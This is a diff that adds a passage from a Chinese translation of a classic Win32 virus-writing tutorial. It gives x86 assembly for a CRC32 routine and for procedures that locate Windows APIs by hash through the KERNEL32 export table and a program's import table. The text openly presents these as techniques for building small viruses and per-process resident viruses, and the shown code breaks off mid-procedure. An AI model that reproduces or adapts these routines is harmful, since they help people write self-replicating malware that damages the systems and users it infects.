@@ -1,0 +1,187 @@
+
+如果你测试上述代码，你将会发现，如果你单击了在子进程中的 `Accept` 按钮，那么你将不得不去单击在父进程中的 `Accept` 按钮。是不是很有意思呀？如果父进程死了，所有相关的线程和它一起死了，但是不过子进程死了，父进程还仍然存活者。
+
+所以看到你可以通过父进程和子进程通过 `WaitForSingleObject` 控制两个进程相当有趣。想象一下可能性：在目录里搜索一个特定文件（如 `MIRC.INI`）同时你在产生一个多态解密程序，并解包余下的东西...哇！;)
+
+看看 `Benny` 的关于 `Threads` 和 `Fibers` (29A#4)的教程。
+
+`% CRC32 (IT/ET) %`
+
+`~~~~~~~~~~~~~`
+
+好了，我们都知道（我希望是这样）怎么编写一个 API 搜索引擎...它相当简单，而且你有许多教程选择（`JHB` 的，`Lord Julus` 的，和这篇教程...），只要得到一个，并学习它。但是，正如你意识到的，API 地址占（让我们说浪费）了你的病毒的许多字节。如果你想要编写一个小病毒，该怎么解决这个问题呢？
+
+解决方法：`CRC32`
+
+我相信 `GriYo` 是第一个使用这个技术的人，在它的令人印象深刻的 `Win32.Parvo` 病毒中（源代码还没有公布）。它不是搜索一个确定数量和我们代码中 API 名字相符的字节，而是获得所有的 API 名，一个接一个，并得到它们的 `CRC32` 值，把它和我们搜索的 API 的 `CRC32` 值。如果它是等价的，那么我们必须总是要处理。Ok,ok...首先，你需要一些获取 `CRC32` 值的代码 :) 让我们用 `Zhengxi` 的代码，首先由 `Vecna` 重新组合了，最终由我重新组合了（优化了一些字节）;)
+
+`;-------到这里为止剪切------------------------------------------------------`
+
+```
+;
+; CRC32 procedure
+; ===============
+;
+; input:
+;   ESI = Offset where code to calculate begins
+;   EDI = Size of that code
+; output:
+;   EAX = CRC32 of  given code
+;
+ CRC32        proc
+        cld
+        xor     ecx,ecx                   ; Optimized by me - 2 bytes
+        dec     ecx                       ; less
+        mov     edx,ecx
+
+NextByteCRC:
+        xor     eax,eax
+        xor     ebx,ebx
+        lodsb
+        xor     al,cl
+        mov     cl,ch
+        mov     ch,dl
+        mov     dl,dh
+        mov     dh,8
+
+NextBitCRC:
+        shr     bx,1
+        rcr     ax,1
+        jnc     NoCRC
+        xor     ax,08320h
+        xor     bx,0EDB8h
+
+NoCRC: dec     dh
+        jnz     NextBitCRC
+        xor     ecx,eax
+        xor     edx,ebx
+        dec     edi                       ; 1 byte less
+        jnz     NextByteCRC
+        not     edx
+        not     ecx
+        mov     eax,edx
+        rol     eax,16
+        mov     ax,cx
+        ret
+
+ CRC32        endp
+;------到这里为止剪切--------------------------------------------------------
+```
+
+我们现在知道怎么获得一个指定的字符串或代码的 `CRC32` 值了，但是在这里你在期望另外一件事情...呵呵呵，耶！你在等待 API 搜索引擎的代码 :)
+
+`;------从这里开始剪切--------------------------------------------------------`
+
+```
+;
+; GetAPI_ET_CRC32 procedure
+; =========================
+; 呵，很难的名字?这个函数在 KERNEL32 的输出表中搜索一个 API 名字(改变一点点将会
+; 使它对任何 DLL 有用)，但是仅仅需要 API 的 CRC32 值，不是全字符串:)还需要一个就像
+; 我在上面给出的获取 CRC32 的例程。
+;
+; input:
+;        EAX = CRC32 of the API ASCIIz name
+; output:
+;   EAX = API address
+;
+ GetAPI_ET_CRC32 proc
+        xor     edx,edx
+        xchg    eax,edx                   ; Put CRC32 of da api in EDX
+        mov     word ptr [ebp+Counter],ax       ; Reset counter
+        mov     esi,3Ch
+        add     esi,[ebp+kernel]          ; Get PE header of KERNEL32
+        lodsw
+        add     eax,[ebp+kernel]          ; Normalize
+        mov     esi,[eax+78h]             ; Get a pointer to its
+        add     esi,1Ch                   ; Export Table
+        add     esi,[ebp+kernel]
+        lea     edi,[ebp+AddressTableVA]  ; Pointer to the address table
+        lodsd                  ; Get AddressTable value
+        add     eax,[ebp+kernel]          ; Normalize
+        stosd                  ; And store in its variable
+        lodsd                  ; Get NameTable value
+        add     eax,[ebp+kernel]          ; Normalize
+        push    eax               ; Put it in stack
+        stosd                  ; Store in its variable
+        lodsd                  ; Get OrdinalTable value
+        add     eax,[ebp+kernel]          ; Normalize
+        stosd                  ; Store
+        pop     esi               ; ESI = NameTable VA
+
+@?_3:   push    esi               ; Save again
+        lodsd                  ; Get pointer to an API name
+        add     eax,[ebp+kernel]          ; Normalize
+        xchg    edi,eax               ; Store ptr in EDI
+        mov     ebx,edi               ; And in EBX
+        push    edi               ; Save EDI
+        xor     al,al               ; Reach the null character
+        scasb                  ; that marks us the end of
+        jnz     $-1               ; the api name
+        pop     esi               ; ESI = Pointer to API Name
+        sub     edi,ebx               ; EDI = API Name size
+        push    edx               ; Save API's CRC32
+        call    CRC32               ; Get actual api's CRC32
+        pop     edx               ; Restore API's CRC32
+        cmp     edx,eax               ; Are them equal?
+        jz      @?_4                ; if yes, we got it
+        pop     esi               ; Restore ptr to api name
+        add     esi,4               ; Get the next
+        inc     word ptr [ebp+Counter]      ; And increase the counter
+        jmp     @?_3                ; Get another api!
+
+@?_4:
+
+        pop     esi               ; Remove shit from stack
+        movzx   eax,word ptr [ebp+Counter]      ; AX = Counter
+        shl     eax,1               ; *2 (it's an array of words)
+        add     eax,dword ptr [ebp+OrdinalTableVA] ; Normalize
+        xor     esi,esi               ; Clear ESI
+        xchg    eax,esi               ; ESI = Ptr 2 ordinal; EAX = 0
+        lodsw                  ; Get ordinal in AX
+        shl     eax,2               ; And with it we go to the
+        add     eax,dword ptr [ebp+AddressTableVA] ; AddressTable (array of
+        xchg    esi,eax               ; dwords)
+        lodsd                  ; Get Address of API RVA
+        add     eax,[ebp+kernel]          ; and normalize!! That's it!
+        ret
+
+ GetAPI_ET_CRC32 endp
+
+ AddressTableVA dd      00000000h               ;\\
+ NameTableVA    dd      00000000h               ; > IN THIS ORDER!!
+ OrdinalTableVA dd      00000000h               ;/
+ kernel         dd      0BFF70000h              ; Adapt it to your needs ;)
+ Counter        dw      0000h
+;------到这里为止剪切--------------------------------------------------------
+```
+
+下面是等价的代码，但是现在为了操作 `Import Table`，因此使得你能够仅仅用这些 API 的 `CRC32` 就可以编一个 `Per-Process` 驻留病毒 :)
+
+`;------从这里开始剪切--------------------------------------------------------`
+
+```
+;
+; GetAPI_IT_CRC32 procedure
+; =========================
+;
+; 这个函数将在 Import Table 中搜索和传给例程的 CRC32 值相符的 API。这个对编写一个
+; Per-Process 驻留病毒有用(看看这篇教程的"Per-Process residence"一章)。
+;
+; input:
+;        EAX = CRC32 of the API ASCIIz name
+; output:
+;   EAX = API address
+;        EBX = Pointer to the API address in the Import Table
+;        CF  = Set if routine failed
+;
+ GetAPI_IT_CRC32 proc
+        mov     dword ptr [ebp+TempGA_IT1],eax  ; Save API CRC32 for later
+        mov     esi,dword ptr [ebp+imagebase]   ; ESI = imagebase
+        add     esi,3Ch                     ; Get ptr to PE header
+        lodsw                     ; AX = That pointer
+        cwde                      ; Clear MSW of EAX
+        add     eax,dword ptr [ebp+imagebase]   ; Normalize pointer
+        xchg    esi,eax                     ; ESI = Such pointer
+        lodsd                     ; Get DWORD
+```
